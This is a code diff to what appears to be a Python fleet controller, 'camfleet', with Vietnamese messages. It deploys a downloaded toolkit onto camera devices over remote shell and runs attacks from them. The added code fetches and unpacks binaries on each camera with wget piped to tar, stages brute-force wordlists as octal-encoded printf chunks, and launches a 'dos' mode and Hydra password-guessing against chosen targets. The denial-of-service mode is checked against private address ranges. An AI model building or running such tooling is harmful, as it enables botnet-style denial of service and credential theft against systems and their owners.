@@ -14,6 +14,7 @@ import csv
 import json
 import time
 import uuid
+import shlex
 import base64
 import struct
 import socket
@@ -461,6 +462,81 @@ def start_file_server():
         print(f"[camfleet] file server failed: {e}", flush=True)
 
 
+HYDRA_INPUT = os.path.join(DATADIR, "hydra-input")
+
+
+def prepare_hydra_args(args_str):
+    """Resolve approved server files; leave native Hydra processing to Hydra."""
+    argv = shlex.split(args_str)
+    i = 0
+    while i < len(argv) and argv[i].startswith("--"):
+        if argv[i] in ("--timeout", "--root"):
+            i += 2
+        elif argv[i] == "--dry-run":
+            i += 1
+        else:
+            return args_str, []
+    if i >= len(argv) or argv[i] != "hydra":
+        return args_str, []
+    files, seen = [], set()
+    i += 1
+    while i < len(argv):
+        token = argv[i]
+        flag = token[:2]
+        if flag in ("-L", "-P", "-l", "-p", "-C"):
+            if flag in seen:
+                raise ValueError("Tùy chọn lặp: " + flag)
+            seen.add(flag)
+            attached = len(token) > 2
+            if attached:
+                value = token[2:]
+            else:
+                i += 1
+                if i >= len(argv) or argv[i].startswith("-"):
+                    raise ValueError("Thiếu giá trị cho " + flag)
+                value = argv[i]
+            if flag in ("-L", "-P"):
+                name = "user.txt" if flag == "-L" else "password.txt"
+                if value == "/tmp/hydra-input/" + name or value == name:
+                    value = os.path.join(HYDRA_INPUT, name)
+                source = os.path.realpath(value)
+                allowed = os.path.realpath(HYDRA_INPUT)
+                if os.path.commonpath([allowed, source]) != allowed:
+                    raise ValueError("File phải nằm trong " + HYDRA_INPUT)
+                try:
+                    if not os.path.isfile(source):
+                        raise OSError("không phải file thường")
+                    with open(source, "rb") as stream:
+                        data = stream.read()
+                except OSError as exc:
+                    raise ValueError("Không đọc được file " + value) from exc
+                if not data:
+                    raise ValueError("File rỗng: " + value)
+                destination = "/tmp/hydra-input/" + name
+                files.append((destination, data))
+                argv[i] = flag + destination if attached else destination
+        elif token in ("-t", "-T", "-w", "-W", "-c", "-s", "-m", "-o", "-b", "-e", "-M"):
+            i += 1
+        i += 1
+    if ("-L" in seen and "-l" in seen) or ("-P" in seen and "-p" in seen) or (files and "-C" in seen):
+        raise ValueError("Không trộn -L/-P với -l/-p tương ứng hoặc -C")
+    return shlex.join(argv), files
+
+
+def hydra_file_commands(files, marker):
+    commands = ["test -x /tmp/camera-tools/bin/hydra",
+                "umask 077 && mkdir -p /tmp/hydra-input && chmod 700 /tmp/hydra-input"]
+    for destination, data in files:
+        temp = destination + "." + uuid.uuid4().hex
+        commands.append("umask 077 && printf '' > " + shlex.quote(temp))
+        for offset in range(0, len(data), 128):
+            encoded = "".join("\\%03o" % byte for byte in data[offset:offset + 128])
+            commands.append("printf '%b' " + shlex.quote(encoded) + " >> " + shlex.quote(temp))
+        commands.append("test -r " + shlex.quote(temp) + " && mv -f " + shlex.quote(temp) + " " + shlex.quote(destination))
+    encoded_marker = "\\n" + "".join("\\%03o" % ord(char) for char in marker) + "\\n"
+    return [cmd + " && printf " + shlex.quote(encoded_marker) for cmd in commands]
+
+
 # ------------------------------------------------------------ engine
 class Engine:
     def __init__(self):
@@ -712,34 +788,25 @@ class Engine:
         results = []
 
         def _deploy_one(ip):
-            self._emit_log("deploy", "info", f"[{ip}] Tải camera-tools.tar.gz…")
-            ok, out = POOL.run_cmd(ip, f"rm -rf /tmp/camera-tools /tmp/camera-tools.tar.gz; wget -q {url} -O /tmp/camera-tools.tar.gz", timeout=60)
-            if not ok:
-                self._emit_log("deploy", "error", f"[{ip}] wget thất bại: {out}")
-                results.append({"ip": ip, "ok": False, "msg": out})
-                return
-            # verify download
-            _, sz = POOL.run_cmd(ip, "ls -la /tmp/camera-tools.tar.gz 2>&1")
-            if "No such" in (sz or ""):
-                self._emit_log("deploy", "error", f"[{ip}] wget tải nhưng file không tồn tại")
-                results.append({"ip": ip, "ok": False, "msg": "file not found after wget"})
-                return
-            self._emit_log("deploy", "info", f"[{ip}] Giải nén…")
-            # try tar xzf first
-            POOL.run_cmd(ip, "cd /tmp && tar xzf camera-tools.tar.gz 2>&1", timeout=30)
+            tar_url = url.replace(".tar.gz", ".tar")
+            self._emit_log("deploy", "info", f"[{ip}] Dọn dẹp /tmp…")
+            POOL.run_cmd(ip, "rm -rf /tmp/camera-tools /tmp/camera-tools.tar /tmp/camera-tools.tar.gz", timeout=10)
+            # Stream extract: wget pipe to tar — never stores archive on disk
+            self._emit_log("deploy", "info", f"[{ip}] Tải + giải nén camera-tools (stream)…")
+            ok, out = POOL.run_cmd(ip, f"cd /tmp && wget -q {tar_url} -O - | tar xf -", timeout=120)
             _, chk = POOL.run_cmd(ip, "ls /tmp/camera-tools/cam-run 2>&1")
             extracted = "cam-run" in (chk or "") and "No such" not in (chk or "")
             if not extracted:
-                # gzip not supported in busybox — download uncompressed .tar
-                tar_url = url.replace(".tar.gz", ".tar")
-                self._emit_log("deploy", "info", f"[{ip}] tar.gz thất bại, tải .tar…")
-                POOL.run_cmd(ip, f"rm -f /tmp/camera-tools.tar; wget -q {tar_url} -O /tmp/camera-tools.tar", timeout=60)
-                POOL.run_cmd(ip, "cd /tmp && tar xf camera-tools.tar 2>&1", timeout=30)
+                # Fallback: download then extract
+                self._emit_log("deploy", "info", f"[{ip}] Stream thất bại, thử tải file…")
+                POOL.run_cmd(ip, "rm -rf /tmp/camera-tools", timeout=5)
+                POOL.run_cmd(ip, f"cd /tmp && wget -q {tar_url} -O camera-tools.tar", timeout=120)
+                POOL.run_cmd(ip, "cd /tmp && tar xf camera-tools.tar 2>&1", timeout=60)
+                POOL.run_cmd(ip, "rm -f /tmp/camera-tools.tar", timeout=5)
                 _, chk = POOL.run_cmd(ip, "ls /tmp/camera-tools/cam-run 2>&1")
                 extracted = "cam-run" in (chk or "") and "No such" not in (chk or "")
             if extracted:
                 POOL.run_cmd(ip, "chmod +x /tmp/camera-tools/cam-run /tmp/camera-tools/bin/* 2>/dev/null", timeout=10)
-                POOL.run_cmd(ip, "rm -f /tmp/camera-tools.tar /tmp/camera-tools.tar.gz 2>/dev/null", timeout=5)
                 self._emit_log("deploy", "ok", f"[{ip}] ✓ Deploy camera-tools thành công")
                 results.append({"ip": ip, "ok": True, "msg": "OK"})
             else:
@@ -752,7 +819,7 @@ class Engine:
             threads.append(t)
             t.start()
         for t in threads:
-            t.join(timeout=70)
+            t.join(timeout=180)
 
         ok_count = sum(1 for r in results if r["ok"])
         self._emit_log("deploy", "ok", f"Deploy camera-tools xong: {ok_count}/{len(ips)}")
@@ -787,6 +854,29 @@ class Engine:
 
     # -- exec binary (phase 5) -----------------------------------------
     def exec_binary(self, ips, target_ip, args_str="", mode="dos"):
+        files = []
+        if mode != "dos":
+            try:
+                args_str, files = prepare_hydra_args(args_str)
+            except ValueError as exc:
+                return 400, {"error": str(exc)}
+        if files:
+            if not ips:
+                return 400, {"error": "Chưa chọn hoặc kết nối Camera"}
+            for ip in ips:
+                marker = "HYDRA_READY_" + uuid.uuid4().hex
+                for step, command in enumerate(hydra_file_commands(files, marker)):
+                    ok, output = POOL.run_cmd(ip, command, timeout=20)
+                    if not ok or marker not in [line.strip() for line in output.splitlines()]:
+                        if not ok:
+                            message = f"[{ip}] Không gửi được lệnh chuẩn bị file: {output}"
+                        elif step == 0:
+                            message = f"[{ip}] Không tìm thấy Hydra có quyền thực thi tại /tmp/camera-tools/bin/hydra. Cần cài bản Hydra phù hợp với Camera; Hydra trên Pi không được dùng trong chế độ chạy Camera."
+                        else:
+                            message = f"[{ip}] Không ghi được file Hydra tại /tmp/hydra-input (bước {step}); kiểm tra quyền ghi và dung lượng /tmp."
+                        self._emit_log("exec", "error", message)
+                        return 400, {"error": message}
+                self._emit_log("exec", "info", f"[{ip}] Đã chuẩn bị file Hydra")
         if mode == "dos":
             if not valid_ipv4(target_ip) or not is_private_ipv4(target_ip):
                 return 403, {"error": f"Mục tiêu {target_ip} ngoài RFC1918"}
